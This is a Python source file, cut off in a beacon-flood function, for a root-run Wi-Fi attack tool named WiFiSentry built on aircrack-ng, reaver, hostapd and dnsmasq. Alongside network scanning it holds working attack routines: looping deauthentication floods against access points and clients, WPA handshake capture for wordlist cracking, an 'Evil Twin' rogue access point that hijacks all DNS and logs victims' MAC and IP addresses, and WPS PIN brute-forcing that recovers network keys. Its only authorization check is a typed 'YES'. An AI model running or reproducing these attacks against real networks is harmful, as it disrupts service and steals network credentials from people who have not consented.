import subprocess
import os
import time
import re
import sys
import json
import logging
import signal
import shutil
import random
import string
import matplotlib.pyplot as plt
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress
from rich.live import Live
from rich.text import Text

# Ensure script runs with sudo
if os.geteuid() != 0:
    print("This tool requires root privileges. Please run with sudo.")
    sys.exit(1)

# Initialize rich console
console = Console()

# Setup logging
log_dir = "wifisentry_logs"
output_dir = "wifisentry_captures"
temp_dir = os.path.join(output_dir, "temp")
for d in [log_dir, output_dir, temp_dir]:
    if not os.path.exists(d):
        os.makedirs(d)
log_file = os.path.join(log_dir, f"wifisentry_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
logging.basicConfig(filename=log_file, level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logging.info("WiFiSentry started.")

# Configuration
CONFIG_FILE = "wifisentry_config.json"
DEFAULT_CONFIG = {
    "default_interface": "wlan0",
    "output_dir": output_dir,
    "temp_dir": temp_dir,
    "scan_duration": 15,
    "capture_duration": 30,
    "retry_attempts": 3,
    "real_time_update_interval": 2,
    "wordlist_path": "/usr/share/wordlists/rockyou.txt",
    "auto_deauth_retries": 3,
    "fake_ap_channel": "6",
    "wps_timeout": 300,
    "session_id": "".join(random.choices(string.ascii_letters + string.digits, k=16))
}

def load_config():
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, "r") as f:
                config = json.load(f)
                for key, value in DEFAULT_CONFIG.items():
                    if key not in config:
                        config[key] = value
                logging.info(f"Loaded config: {config}")
                return config
        logging.info("No config file found, using default config.")
        config = DEFAULT_CONFIG.copy()
        save_config(config)
        return config
    except (json.JSONDecodeError, IOError) as e:
        console.print(f"[bold red]Error loading config: {e}[/bold red]")
        logging.error(f"Config load failed: {e}")
        return DEFAULT_CONFIG.copy()

def save_config(config):
    try:
        with open(CONFIG_FILE, "w") as f:
            json.dump(config, f, indent=4)
        logging.info("Configuration saved.")
    except IOError as e:
        console.print(f"[bold red]Error saving config: {e}[/bold red]")
        logging.error(f"Config save failed: {e}")

def check_dependencies():
    dependencies = {
        "aircrack-ng": "apt-get install -y aircrack-ng",
        "usbutils": "apt-get install -y usbutils",
        "tshark": "apt-get install -y tshark",
        "reaver": "apt-get install -y reaver",
        "wash": "apt-get install -y reaver",
        "hostapd": "apt-get install -y hostapd",
        "dnsmasq": "apt-get install -y dnsmasq",
        "mdk4": "apt-get install -y mdk4"
    }
    python_libs = ["rich", "matplotlib"]
    
    with Progress(console=console) as progress:
        task = progress.add_task("[cyan]Verifying dependencies", total=len(dependencies) + len(python_libs))
        for dep, install_cmd in dependencies.items():
            if not shutil.which(dep.split("-")[0]):
                try:
                    subprocess.run(install_cmd.split(), check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    console.print(f"[bold green]Installed {dep}[/bold green]")
                    logging.info(f"Installed {dep}")
                except subprocess.CalledProcessError as e:
                    console.print(f"[bold red]Failed to install {dep}.[/bold red]")
                    console.print(f"[yellow]Run: sudo apt update && sudo apt install {dep}[/yellow]")
                    logging.error(f"Failed to install {dep}: {e.stderr}")
                    if dep not in ["reaver", "wash", "hostapd", "dnsmasq", "mdk4"]:
                        sys.exit(1)
            progress.advance(task)
        
        for lib in python_libs:
            try:
                __import__(lib)
            except ImportError:
                try:
                    subprocess.run(["pip3", "install", lib], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    console.print(f"[bold green]Installed Python library {lib}[/bold green]")
                    logging.info(f"Installed Python library {lib}")
                except subprocess.CalledProcessError:
                    console.print(f"[bold red]Failed to install {lib}.[/bold red]")
                    console.print(f"[yellow]Run: pip3 install {lib}[/yellow]")
                    logging.error(f"Failed to install {lib}")
                    sys.exit(1)
            progress.advance(task)

def detect_wireless_adapters():
    interfaces = []
    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True, check=True)
        logging.info(f"iwconfig output: {result.stdout}")
        for line in result.stdout.splitlines():
            if not line.strip():
                continue
            parts = line.split()
            if parts and ("IEEE 802.11" in line or "Mode:Monitor" in line):
                interfaces.append(parts[0])
        
        result = subprocess.run(["iw", "dev"], capture_output=True, text=True, check=True)
        logging.info(f"iw dev output: {result.stdout}")
        current_interface = None
        for line in result.stdout.splitlines():
            if "Interface" in line:
                current_interface = line.split()[-1]
            elif current_interface and "type" in line and current_interface not in interfaces:
                interfaces.append(current_interface)
        
        if not interfaces:
            console.print("[bold red]No wireless adapters found.[/bold red]")
            console.print("[yellow]Diagnostics: lsusb, iwconfig, sudo airmon-ng start wlan0[/yellow]")
            logging.error("No wireless adapters detected.")
            sys.exit(1)
        logging.info(f"Detected interfaces: {interfaces}")
        return list(set(interfaces))
    except subprocess.CalledProcessError as e:
        console.print(f"[bold red]Error detecting adapters: {e.stderr}[/bold red]")
        logging.error(f"Adapter detection failed: {e}")
        sys.exit(1)

def is_monitor_mode(interface):
    try:
        result = subprocess.run(["iwconfig", interface], capture_output=True, text=True, check=True)
        monitor = "Mode:Monitor" in result.stdout
        logging.info(f"Interface {interface} monitor mode: {monitor}")
        return monitor
    except subprocess.CalledProcessError:
        logging.error(f"Failed to check monitor mode for {interface}")
        return False

def cleanup_monitor_interfaces(preserve_wlan0mon=True):
    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True, check=True)
        for line in result.stdout.splitlines():
            if not line.strip():
                continue
            if "Mode:Monitor" in line:
                mon_interface = line.split()[0]
                if preserve_wlan0mon and mon_interface == "wlan0mon":
                    continue
                subprocess.run(["airmon-ng", "stop", mon_interface], capture_output=True, check=True)
        subprocess.run(["service", "NetworkManager", "stop"], capture_output=True, check=True)
        subprocess.run(["rfkill", "unblock", "all"], capture_output=True, check=True)
        logging.info("Cleaned up non-wlan0mon interfaces.")
    except subprocess.CalledProcessError as e:
        console.print(f"[bold red]Error cleaning up monitor interfaces: {e.stderr}[/bold red]")
        logging.error(f"Monitor cleanup failed: {e.stderr}")

def select_adapter():
    cleanup_monitor_interfaces(preserve_wlan0mon=True)
    interfaces = detect_wireless_adapters()
    
    if "wlan0" in interfaces and not is_monitor_mode("wlan0"):
        console.print("[bold green]wlan0 detected as managed mode adapter.[/bold green]")
        logging.info("wlan0 detected as managed mode adapter.")
    if "wlan0mon" in interfaces and is_monitor_mode("wlan0mon"):
        console.print("[bold green]wlan0mon detected in monitor mode.[/bold green]")
        logging.info("wlan0mon detected in monitor mode.")
        return "wlan0mon", False
    
    valid_interfaces = []
    for iface in interfaces:
        if not is_monitor_mode(iface):
            try:
                result = subprocess.run(["airmon-ng", "start", iface], capture_output=True, text=True, check=True)
                subprocess.run(["airmon-ng", "stop", iface], capture_output=True, check=True)
                valid_interfaces.append(iface)
                logging.info(f"Monitor mode validated for {iface}")
            except subprocess.CalledProcessError as e:
                logging.warning(f"Monitor mode test failed for {iface}: {e.stderr}")
    
    if not valid_interfaces and not ("wlan0mon" in interfaces and is_monitor_mode("wlan0mon")):
        console.print("[bold red]No adapters support monitor mode.[/bold red]")
        console.print("[yellow]Diagnostics: Use Atheros AR9271, update drivers, enable USB passthrough.[/yellow]")
        logging.error("No monitor mode capable adapters found.")
        sys.exit(1)
    
    config = load_config()
    if "wlan0mon" in interfaces and is_monitor_mode("wlan0mon"):
        return "wlan0mon", False
    
    if config["default_interface"] in valid_interfaces:
        return config["default_interface"], True
    
    if len(valid_interfaces) == 1:
        config["default_interface"] = valid_interfaces[0]
        save_config(config)
        console.print(f"[bold green]Auto-selected interface: {valid_interfaces[0]}[/bold green]")
        return valid_interfaces[0], True
    
    table = Table(title="Available Wireless Adapters")
    table.add_column("No.", style="cyan")
    table.add_column("Interface", style="green")
    for i, iface in enumerate(valid_interfaces, 1):
        table.add_row(str(i), iface)
    console.print(table)
    choice = console.input("[cyan]Select an adapter (number) or press Enter for first: [/cyan]")
    selected = valid_interfaces[0] if not choice else valid_interfaces[int(choice) - 1]
    config["default_interface"] = selected
    save_config(config)
    console.print(f"[bold green]Selected interface: {selected}[/bold green]")
    logging.info(f"Selected interface: {selected}")
    return selected, True

def enable_monitor_mode(interface):
    if is_monitor_mode(interface):
        try:
            subprocess.run(["iwconfig", interface, "txpower", "30"], check=True, capture_output=True)
            console.print("[bold green]High-power mode set for Atheros adapter.[/bold green]")
            logging.info("Set high-power mode for Atheros adapter.")
        except subprocess.CalledProcessError as e:
            logging.warning(f"Failed to set high-power mode: {e.stderr}")
        return interface
    
    config = load_config()
    for attempt in range(config["retry_attempts"]):
        try:
            subprocess.run(["airmon-ng", "check", "kill"], capture_output=True, check=True)
            result = subprocess.run(["airmon-ng", "start", interface], capture_output=True, text=True, check=True)
            mon_interface = None
            for line in result.stdout.splitlines():
                if "monitor mode vif enabled" in line:
                    mon_interface = re.search(r"\[(.*?)\]", line).group(1)
            if not mon_interface:
                result = subprocess.run(["iwconfig"], capture_output=True, text=True, check=True)
                for line in result.stdout.splitlines():
                    if "Mode:Monitor" in line and line.strip():
                        mon_interface = line.split()[0]
            if mon_interface:
                try:
                    subprocess.run(["iwconfig", mon_interface, "txpower", "30"], check=True, capture_output=True)
                    console.print("[bold green]High-power mode set for Atheros adapter.[/bold green]")
                    logging.info("Set high-power mode for Atheros adapter.")
                except subprocess.CalledProcessError as e:
                    logging.warning(f"Failed to set high-power mode: {e.stderr}")
                console.print(f"[bold green]Monitor mode enabled on {mon_interface}[/bold green]")
                logging.info(f"Monitor mode enabled on {mon_interface}")
                return mon_interface
            else:
                logging.error("Failed to detect monitor mode interface.")
                return None
        except subprocess.CalledProcessError as e:
            console.print(f"[bold red]Monitor mode enable failed (attempt {attempt + 1}): {e.stderr}[/bold red]")
            logging.error(f"Monitor mode enable failed (attempt {attempt + 1}): {e.stderr}")
            time.sleep(2 ** attempt)
    console.print("[bold red]Failed to enable monitor mode.[/bold red]")
    logging.error("Monitor mode enable failed after retries.")
    return None

def disable_monitor_mode(interface):
    try:
        subprocess.run(["airmon-ng", "stop", interface], capture_output=True, check=True)
        subprocess.run(["service", "NetworkManager", "start"], capture_output=True, check=True)
        subprocess.run(["rfkill", "unblock", "all"], capture_output=True, check=True)
        console.print("[bold green]Monitor mode disabled and network services restarted.[/bold green]")
        logging.info("Monitor mode disabled and network services restarted.")
    except subprocess.CalledProcessError as e:
        console.print(f"[bold red]Error disabling monitor mode: {e.stderr}[/bold red]")
        logging.error(f"Monitor mode disable failed: {e.stderr}")

def scan_wps(mon_interface):
    config = load_config()
    output_file = os.path.join(config["temp_dir"], "wps_scan")
    wps_networks = {}
    try:
        process = subprocess.Popen(
            ["wash", "-i", mon_interface, "-o", output_file, "-j"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(10)
        process.send_signal(signal.SIGINT)
        process.wait()
        if os.path.exists(output_file):
            with open(output_file, "r") as f:
                data = json.load(f)
            for ap in data:
                wps_networks[ap["bssid"]] = "Enabled" if ap["wps"] else "Disabled"
            os.remove(output_file)
        logging.info(f"WPS scan completed: {len(wps_networks)} networks scanned.")
    except (subprocess.CalledProcessError, json.JSONDecodeError) as e:
        console.print(f"[bold red]WPS scan failed: {e}[/bold red]")
        logging.error(f"WPS scan failed: {e}")
    return wps_networks

def scan_networks(mon_interface, real_time=False):
    config = load_config()
    output_file = os.path.join(config["temp_dir"], "wifi_scan")
    
    if real_time:
        console.print("[yellow]Starting real-time network monitoring (press Ctrl+C to stop)...[/yellow]")
        logging.info("Starting real-time network monitoring.")
    else:
        console.print(f"[yellow]Scanning for networks for {config['scan_duration']} seconds...[/yellow]")
        logging.info("Starting network scan.")
    
    wps_networks = scan_wps(mon_interface)
    networks = []
    clients = []
    process = None
    try:
        process = subprocess.Popen(
            ["airodump-ng", mon_interface, "--band", "abg", "-w", output_file, "--write-interval", "1", "--output-format", "csv"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        if real_time:
            with Live(console=console, refresh_per_second=1) as live:
                while True:
                    networks, clients = parse_scan_output(f"{output_file}-01.csv", wps_networks)
                    table = create_network_table(networks, clients)
                    live.update(table)
                    time.sleep(config["real_time_update_interval"])
        else:
            with Progress(console=console) as progress:
                task = progress.add_task("[cyan]Scanning networks", total=config["scan_duration"])
                for _ in range(config["scan_duration"]):
                    progress.advance(task)
                    time.sleep(1)
        process.send_signal(signal.SIGINT)
        process.wait()
    except KeyboardInterrupt:
        if process:
            process.send_signal(signal.SIGINT)
            process.wait()
    except subprocess.CalledProcessError as e:
        console.print(f"[bold red]Scan failed: {e.stderr}[/bold red]")
        logging.error(f"Scan failed: {e.stderr}")
        return [], []
    
    try:
        networks, clients = parse_scan_output(f"{output_file}-01.csv", wps_networks)
        os.remove(f"{output_file}-01.csv")
        console.print(f"[bold green]Scan completed: {len(networks)} networks, {len(clients)} clients found.[/bold green]")
        logging.info(f"Scan completed, found {len(networks)} networks, {len(clients)} clients.")
        if networks:
            plot_signal_strength(networks, config["temp_dir"])
    except FileNotFoundError:
        console.print("[bold red]No scan results found.[/bold red]")
        logging.error("No scan results found.")
        return [], []
    return networks, clients

def parse_scan_output(csv_file, wps_networks):
    networks = []
    clients = []
    try:
        with open(csv_file, "r") as f:
            lines = f.readlines()
            in_ap_section = True
            for line in lines:
                if "Station" in line:
                    in_ap_section = False
                    continue
                if in_ap_section and "," in line and "BSSID" not in line:
                    parts = line.strip().split(",")
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        essid = parts[13].strip()
                        channel = parts[3].strip()
                        encryption = parts[5].strip()
                        auth = parts[6].strip() or "Unknown"
                        power = parts[8].strip()
                        vulnerabilities = []
                        if "WEP" in encryption:
                            vulnerabilities.append("WEP (Critical)")
                        if not essid:
                            vulnerabilities.append("Hidden SSID (Medium)")
                        if essid.lower() in ["linksys", "netgear", "default", "dlink"]:
                            vulnerabilities.append("Default SSID (Low)")
                        networks.append({
                            "BSSID": bssid,
                            "ESSID": essid or "Hidden",
                            "Channel": channel,
                            "Encryption": encryption,
                            "Auth": auth,
                            "Signal (dBm)": power,
                            "Vulnerabilities": ", ".join(vulnerabilities) or "None",
                            "WPS": wps_networks.get(bssid, "Unknown")
                        })
                elif not in_ap_section and "," in line and "Station" not in line:
                    parts = line.strip().split(",")
                    if len(parts) >= 6:
                        client_mac = parts[0].strip()
                        bssid = parts[5].strip()
                        power = parts[3].strip()
                        clients.append({
                            "Client MAC": client_mac,
                            "Associated BSSID": bssid,
                            "Signal (dBm)": power
                        })
    except FileNotFoundError:
        pass
    return networks, clients

def create_network_table(networks, clients):
    table = Table(title=f"Discovered Networks ({len(networks)} Networks, {len(clients)} Clients)", border_style="bold cyan")
    table.add_column("BSSID", style="cyan")
    table.add_column("ESSID", style="green")
    table.add_column("Channel", style="blue")
    table.add_column("Encryption", style="yellow")
    table.add_column("Auth", style="yellow")
    table.add_column("Signal (dBm)", style="magenta")
    table.add_column("WPS", style="cyan")
    table.add_column("Vulnerabilities", style="red")
    for n in networks:
        signal = int(n["Signal (dBm)"]) if n["Signal (dBm)"].strip() else -100
        style = "bold green" if signal > -50 else "bold yellow" if signal > -70 else "bold red"
        vuln_style = "bold red" if "Critical" in n["Vulnerabilities"] else "bold yellow" if "Medium" in n["Vulnerabilities"] else "bold green"
        wps_style = "bold green" if n["WPS"] == "Enabled" else "bold red"
        table.add_row(
            n["BSSID"],
            n["ESSID"],
            n["Channel"],
            n["Encryption"],
            n["Auth"],
            f"[{style}]{n['Signal (dBm)']}[/{style}]",
            f"[{wps_style}]{n['WPS']}[/{wps_style}]",
            f"[{vuln_style}]{n['Vulnerabilities']}[/{vuln_style}]"
        )
    return table

def plot_signal_strength(networks, output_dir):
    essids = [n["ESSID"][:15] + "..." if len(n["ESSID"]) > 15 else n["ESSID"] for n in networks]
    signals = [int(n["Signal (dBm)"]) if n["Signal (dBm)"].strip() else -100 for n in networks]
    plt.figure(figsize=(12, 6))
    bars = plt.bar(essids, signals, color=["#2ecc71" if s > -50 else "#f1c40f" if s > -70 else "#e74c3c" for s in signals], edgecolor="black")
    plt.title("Wi-Fi Signal Strength Analysis", fontsize=14, pad=20)
    plt.xlabel("Network (ESSID)", fontsize=12)
    plt.ylabel("Signal Strength (dBm)", fontsize=12)
    plt.xticks(rotation=45, ha="right", fontsize=10)
    plt.grid(True, axis="y", linestyle="--", alpha=0.7)
    for bar in bars:
        yval = bar.get_height()
        plt.text(bar.get_x() + bar.get_width()/2, yval + 1, f"{yval} dBm", ha="center", va="bottom", fontsize=9)
    plt.tight_layout()
    plot_path = os.path.join(output_dir, f"signal_strength_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
    plt.savefig(plot_path, dpi=150)
    plt.close()
    console.print(f"[bold green]Signal strength plot saved to {plot_path}[/bold green]")
    logging.info(f"Signal strength plot saved to {plot_path}")
    return plot_path

def display_networks(networks, clients):
    if not networks:
        console.print("[bold red]No networks found.[/bold red]")
        return
    console.print(create_network_table(networks, clients))
    
    if clients:
        client_table = Table(title="Connected Clients", border_style="bold cyan")
        client_table.add_column("Client MAC", style="cyan")
        client_table.add_column("Associated BSSID", style="green")
        client_table.add_column("Signal (dBm)", style="magenta")
        for c in clients:
            signal = int(c["Signal (dBm)"]) if c["Signal (dBm)"].strip() else -100
            style = "bold green" if signal > -50 else "bold yellow" if signal > -70 else "bold red"
            client_table.add_row(c["Client MAC"], c["Associated BSSID"], f"[{style}]{c['Signal (dBm)']}[/{style}]")
        console.print(client_table)

def capture_packets(mon_interface, bssid, channel, essid, deauth=False, client_mac=None, deauth_count=5):
    config = load_config()
    output_file = os.path.join(config["temp_dir"], f"capture_{essid.replace(' ', '_')}")
    report_file = os.path.join(config["temp_dir"], f"report_{essid.replace(' ', '_')}.txt")
    
    if deauth:
        console.print("[bold red]WARNING: Deauthentication requires explicit permission.[/bold red]")
        confirm = console.input(f"[bold red]Type 'YES' to confirm authorization (Session ID: {config['session_id']}): [/bold red]")
        if confirm != "YES":
            console.print("[bold red]Deauthentication cancelled.[/bold red]")
            logging.info("Deauthentication cancelled by user.")
            deauth = False
        else:
            console.print("[bold green]Authorization confirmed.[/bold green]")
            logging.info(f"User confirmed authorization for deauth on {essid} (Session ID: {config['session_id']})")
    
    console.print(f"[yellow]Capturing packets for {essid} (BSSID: {bssid}) on channel {channel}. Press Ctrl+C to stop...[/yellow]")
    logging.info(f"Capturing packets for {essid} (BSSID: {bssid})")
    
    try:
        subprocess.run(["iwconfig", mon_interface, "channel", channel], check=True, capture_output=True)
        deauth_process = None
        if deauth:
            deauth_cmd = ["aireplay-ng", "--deauth", str(deauth_count), "-a", bssid]
            if client_mac:
                deauth_cmd.extend(["-c", client_mac])
            deauth_cmd.append(mon_interface)
            deauth_process = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        process = subprocess.Popen(
            ["airodump-ng", mon_interface, "--bssid", bssid, "--channel", channel, "-w", output_file, "--write-interval", "1", "--output-format", "pcap"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        capture_path = f"{output_file}-01.cap"
        packet_count = 0
        handshake = False
        with Live(console=console, refresh_per_second=1) as live:
            while True:
                if os.path.exists(capture_path):
                    packet_count += 1
                    try:
                        result = subprocess.run(["aircrack-ng", capture_path], capture_output=True, text=True, check=True)
                        if "handshake" in result.stdout.lower():
                            handshake = True
                            console.print("[bold green]Handshake captured! Stopping capture...[/bold green]")
                            break
                    except subprocess.CalledProcessError:
                        pass
                live.update(Text(f"[cyan]Packets captured: {packet_count}[/cyan]"))
                time.sleep(1)
        
        process.send_signal(signal.SIGINT)
        process.wait()
        if deauth and deauth_process:
            deauth_process.send_signal(signal.SIGINT)
            deauth_process.wait()
        
        logging.info(f"Packet capture saved to {capture_path}")
        
        report = f"Capture Report for {essid}\n"
        report += f"BSSID: {bssid}\nChannel: {channel}\nFile: {capture_path}\n"
        report += f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        report += f"Encryption: {next((n['Encryption'] for n in session_networks if n['BSSID'] == bssid), 'Unknown')}\n"
        report += f"Handshake Captured: {'Yes' if handshake else 'No'}\n"
        with open(report_file, "w") as f:
            f.write(report)
        return handshake, capture_path, report_file
    except KeyboardInterrupt:
        if process:
            process.send_signal(signal.SIGINT)
            process.wait()
        if deauth and deauth_process:
            deauth_process.send_signal(signal.SIGINT)
            deauth_process.wait()
        console.print("[bold yellow]Capture stopped by user.[/bold yellow]")
        return handshake, capture_path if os.path.exists(capture_path) else None, report_file
    except subprocess.CalledProcessError as e:
        console.print(f"[bold red]Error during capture: {e.stderr}[/bold red]")
        logging.error(f"Packet capture failed: {e.stderr}")
        return False, None, None

def check_client_status(mon_interface, bssid, client_mac):
    config = load_config()
    output_file = os.path.join(config["temp_dir"], "client_check")
    try:
        process = subprocess.Popen(
            ["airodump-ng", mon_interface, "--bssid", bssid, "-w", output_file, "--write-interval", "1", "--output-format", "csv"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(2)
        process.send_signal(signal.SIGINT)
        process.wait()
        _, clients = parse_scan_output(f"{output_file}-01.csv", {})
        os.remove(f"{output_file}-01.csv")
        return any(c["Client MAC"].lower() == client_mac.lower() for c in clients if c["Associated BSSID"].lower() == bssid.lower())
    except (subprocess.CalledProcessError, FileNotFoundError):
        return True

def deauth_attack(mon_interface, bssid, client_mac=None):
    config = load_config()
    console.print("[bold red]WARNING: Deauthentication attack requires explicit permission.[/bold red]")
    confirm = console.input(f"[bold red]Type 'YES' to confirm authorization (Session ID: {config['session_id']}): [/bold red]")
    if confirm != "YES":
        console.print("[bold red]Deauthentication attack cancelled.[/bold red]")
        logging.info("Deauthentication attack cancelled by user.")
        return False
    
    console.print(f"[yellow]Launching deauthentication attack on BSSID: {bssid}. Press Ctrl+C to stop...[/yellow]")
    logging.info(f"Launching deauthentication attack on BSSID: {bssid}")
    
    try:
        deauth_count = 10
        packets_sent = 0
        with Live(console=console, refresh_per_second=1) as live:
            while True:
                cmd = ["aireplay-ng", "--deauth", str(deauth_count), "-a", bssid]
                if client_mac:
                    cmd.extend(["-c", client_mac])
                cmd.append(mon_interface)
                process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(2)
                process.send_signal(signal.SIGINT)
                process.wait()
                packets_sent += deauth_count
                if client_mac:
                    client_connected = check_client_status(mon_interface, bssid, client_mac)
                    live.update(Text(f"[cyan]Deauth packets sent: {packets_sent}, Client connected: {'Yes' if client_connected else 'No'}[/cyan]"))
                    if not client_connected:
                        console.print("[bold green]Client disconnected! Stopping attack...[/bold green]")
                        logging.info(f"Deauthentication attack succeeded: client {client_mac} disconnected.")
                        return True
                else:
                    live.update(Text(f"[cyan]Deauth packets sent: {packets_sent}[/cyan]"))
                time.sleep(1)
    except KeyboardInterrupt:
        console.print("[bold yellow]Deauthentication attack stopped by user.[/bold yellow]")
        logging.info("Deauthentication attack stopped by user.")
        return False
    except subprocess.CalledProcessError as e:
        console.print(f"[bold red]Deauth attack failed: {e.stderr}[/bold red]")
        logging.error(f"Deauth attack failed: {e.stderr}")
        return False

def generate_random_ssids(count=10):
    prefixes = [
        "ATT", "Xfinity", "Starlink", "Verizon", "Spectrum", "T-Mobile", 
        "HomeWiFi", "GuestNet", "SecureLink", "FastConnect", "CloudNet", 
        "MyNetwork", "InternetHub", "WiFiZone", "NetStream"
    ]
    suffixes = ["5G", "2.4G", "Guest", "Secure", "", "_EXT"]
    ssids = []
    for _ in range(count):
        prefix = random.choice(prefixes)
        suffix = random.choice(suffixes)
        number = "".join(random.choices(string.digits, k=3))
        ssid = f"{prefix}{number}{suffix}".strip()
        if len(ssid) > 32:  # Ensure SSID length is within 802.11 limits
            ssid = ssid[:32]
        ssids.append(ssid)
    return ssids

def evil_twin(mon_interface, ssid=None, channel=None):
    config = load_config()
    console.print("[bold red]WARNING: Evil Twin attack requires explicit permission.[/bold red]")
    confirm = console.input(f"[bold red]Type 'YES' to confirm authorization (Session ID: {config['session_id']}): [/bold red]")
    if confirm != "YES":
        console.print("[bold red]Evil Twin attack cancelled.[/bold red]")
        logging.info("Evil Twin attack cancelled by user.")
        return False
    
    if not ssid or not channel:
        random_ssids = generate_random_ssids()
        console.print("[cyan]Select a random SSID for the Evil Twin AP:[/cyan]")
        for i, s in enumerate(random_ssids, 1):
            console.print(f"[cyan]{i}. {s}[/cyan]")
        choice = console.input("[cyan]Enter number (or press Enter for first): [/cyan]")
        ssid = random_ssids[0] if not choice else random_ssids[int(choice) - 1]
        channel = config["fake_ap_channel"]
    
    console.print(f"[yellow]Setting up Evil Twin AP '{ssid}' on channel {channel}...[/yellow]")
    logging.info(f"Setting up Evil Twin AP '{ssid}' on channel {channel}")
    
    try:
        hostapd_conf = f"""
interface={mon_interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        dnsmasq_conf = f"""
interface={mon_interface}
dhcp-range=192.168.1.2,192.168.1.100,12h
address=/#/192.168.1.1
"""
        hostapd_file = os.path.join(config["temp_dir"], "hostapd.conf")
        dnsmasq_file = os.path.join(config["temp_dir"], "dnsmasq.conf")
        dnsmasq_log = os.path.join(config["temp_dir"], "dnsmasq.log")
        with open(hostapd_file, "w") as f:
            f.write(hostapd_conf)
        with open(dnsmasq_file, "w") as f:
            f.write(dnsmasq_conf)
        
        subprocess.run(["ip", "link", "set", mon_interface, "up"], check=True)
        subprocess.run(["ip", "addr", "add", "192.168.1.1/24", "dev", mon_interface], check=True)
        hostapd_proc = subprocess.Popen(["hostapd", hostapd_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        dnsmasq_proc = subprocess.Popen(["dnsmasq", "-C", dnsmasq_file, "-l", dnsmasq_log], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        console.print(f"[bold green]Evil Twin AP '{ssid}' started on channel {channel}. Press Ctrl+C to stop.[/bold green]")
        logging.info(f"Evil Twin AP '{ssid}' started on channel {channel}")
        
        connected_clients = 0
        client_ips = []
        last_lines_processed = 0
        with Live(console=console, refresh_per_second=1) as live:
            while True:
                new_ips = []
                if os.path.exists(dnsmasq_log):
                    with open(dnsmasq_log, "r") as f:
                        lines = f.readlines()
                        for line in lines[last_lines_processed:]:
                            if "DHCPACK" in line:
                                match = re.search(r"DHCPACK\([^)]+\)\s+(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f:]+)", line)
                                if match:
                                    ip, mac = match.groups()
                                    new_ips.append(f"MAC: {mac}, IP: {ip}")
                                    console.print(f"[bold green]Client connected to '{ssid}': MAC: {mac}, IP: {ip}[/bold green]")
                                    logging.info(f"Client connected to Evil Twin '{ssid}': MAC: {mac}, IP: {ip}")
                        last_lines_processed = len(lines)
                        connected_clients = len(set(line for line in lines if "DHCPACK" in line))
                client_ips = new_ips[-5:]  # Show last 5 IPs to avoid clutter
                status = Text.assemble(
                    ("Connected clients: ", "cyan"), (f"{connected_clients}\n", "bold green"),
                    *[(f"{ip}\n", "bold yellow") for ip in client_ips]
                )
                live.update(status)
                time.sleep(1)
    except KeyboardInterrupt:
        hostapd_proc.terminate()
        dnsmasq_proc.terminate()
        subprocess.run(["ip", "addr", "flush", "dev", mon_interface], check=True)
        for f in [hostapd_file, dnsmasq_file, dnsmasq_log]:
            if os.path.exists(f):
                os.remove(f)
        console.print("[bold green]Evil Twin AP stopped.[/bold green]")
        logging.info("Evil Twin AP stopped.")
        return True
    except subprocess.CalledProcessError as e:
        console.print(f"[bold red]Evil Twin setup failed: {e.stderr}[/bold red]")
        logging.error(f"Evil Twin setup failed: {e.stderr}")
        return False

def wps_bruteforce(mon_interface, bssid, essid):
    config = load_config()
    console.print("[bold red]WARNING: WPS brute-forcing requires explicit permission.[/bold red]")
    confirm = console.input(f"[bold red]Type 'YES' to confirm authorization (Session ID: {config['session_id']}): [/bold red]")
    if confirm != "YES":
        console.print("[bold red]WPS brute-forcing cancelled.[/bold red]")
        logging.info("WPS brute-forcing cancelled by user.")
        return None
    
    console.print(f"[yellow]Brute-forcing WPS PIN for {essid} (BSSID: {bssid})...[/yellow]")
    logging.info(f"Brute-forcing WPS PIN for {essid} (BSSID: {bssid})")
    
    try:
        process = subprocess.Popen(
            ["reaver", "-i", mon_interface, "-b", bssid, "-vv", "-L", "-t", str(config["wps_timeout"]), "-c", "1-11"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        pin_attempts = 0
        with Live(console=console, refresh_per_second=1) as live:
            for line in process.stdout:
                pin_attempts += 1 if "Trying pin" in line else 0
                live.update(Text(f"[cyan]{line.strip()} (PINs tried: {pin_attempts})[/cyan]"))
                if "WPS pin found" in line.lower():
                    pin = re.search(r"WPS PIN: '(\d+)'", line)
                    key = re.search(r"WPA PSK: '(.+)'", line)
                    if pin or key:
                        result = {"pin": pin.group(1) if pin else None, "key": key.group(1) if key else None}
                        console.print(f"[bold green]WPS PIN: {result['pin'] or 'N/A'}, Key: {result['key'] or 'N/A'}[/bold green]")
                        logging.info(f"WPS brute-force succeeded for {essid}: PIN {result['pin'] or 'N/A'}, Key {result['key'] or 'N/A'}")
                        process.terminate()
                        return result
        process.wait()
        console.print("[bold red]WPS brute-forcing failed.[/bold red]")
        logging.info(f"WPS brute-forcing failed for {essid}")
        return None
    except subprocess.CalledProcessError as e:
        console.print(f"[bold red]WPS brute-forcing failed: {e.stderr}[/bold red]")
        logging.error(f"WPS brute-forcing failed: {e.stderr}")
        return None

def beacon_flood(mon_interface):
    config = load_config()
    console.print("[bold red]WARNING: Beacon flooding requires explicit permission.[/bold red]")
